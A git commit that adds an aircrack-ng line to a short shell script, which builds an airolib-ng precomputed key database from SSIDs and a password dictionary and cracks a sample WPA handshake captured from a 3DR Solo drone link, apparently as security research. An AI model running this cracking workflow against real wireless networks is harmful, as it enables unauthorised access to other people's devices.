8e5c8e1011f053d96f359889b5a2aecbe5f4e727
Kevin Finisterre <kf@digitalmunition.com>
2015-08-16 21:58:41 -0400

    use sample airolib-ng PMK database to crack the sample Solo handshake in ../

--- SoloRainbowTables/airolib_SoloLink.sh
+++ SoloRainbowTables/airolib_SoloLink.sh
@@ -2,3 +2,5 @@ airolib-ng SoloLinkDB --import essid SSIDs.txt
 airolib-ng SoloLinkDB --import password dict.txt
 airolib-ng SoloLinkDB --clean all
 airolib-ng SoloLinkDB --batch
+aircrack-ng -r SoloLinkDB ../SoloLink_WPA_handshake.pcap 
+
